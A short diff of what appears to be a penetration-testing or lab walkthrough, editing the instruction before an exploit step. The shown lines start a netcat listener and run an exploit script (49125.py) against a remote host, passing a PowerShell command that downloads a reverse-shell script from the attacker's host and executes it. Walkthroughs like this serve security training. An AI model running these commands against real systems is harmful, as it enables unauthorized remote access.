@@ -134,7 +134,7 @@ Start netcat listener
 rlwrap nc -lvnp ${lport}
 ```
 
-Execute the script
+Execute the script. Execute the commands passed as the third argument.
 ```
 cd /tmp
 python3 49125.py $rhost [RPORT] "C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -c wget 'http://${lhost}/mini-reverse.ps1' -outfile 'C:\Users\Bill\Desktop\mini-reverse.ps1'; C:\Users\Bill\Desktop\mini-reverse.ps1" 
